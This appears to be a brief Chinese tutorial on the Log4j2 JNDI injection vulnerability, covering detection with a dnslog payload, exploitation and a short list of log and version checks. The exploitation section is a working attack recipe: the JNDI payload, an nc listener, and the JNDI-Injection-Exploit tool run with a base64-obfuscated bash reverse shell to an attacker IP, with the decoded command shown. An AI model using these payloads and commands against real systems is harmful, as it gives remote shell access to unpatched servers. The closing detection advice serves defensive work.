https://mp.weixin.qq.com/s/PauCiWuR7tDdW5AeArorwQ

# 1测试

1.http://dnslog.cn/ 点击 Get Subdomain获取子域名
2.payload值：`${jndi:ldap://nlhkzw.dnslog.cn}` ,如果是Get方式进行url编码
3.dnslog页面点击 `Refresh Record` 有数据为有漏洞

# 2漏洞利用

https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0

vps上启动监听 

（注意：-A 后面加的是kali服务器IP）
```sh
nc -lvp 6666
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxLjEyOC82NjY2IDA+JjEg}|{base64,-d}|{bash,-i}" -A 192.168.21.128
# base64为 bash -i >& /dev/tcp/192.168.21.128/6666 0>&1 
# 用到 8180 1099 1389 6666 端口
```

# 3漏洞检查

1.检查日志中是否存在"jndi:ldap://"、"jndi:rmi"等分析是否存在攻击行为

2.检查log4j2版本是否在影响版本之内

3.通过安全产品如waf、态势感知、IPS等进行攻击拦截
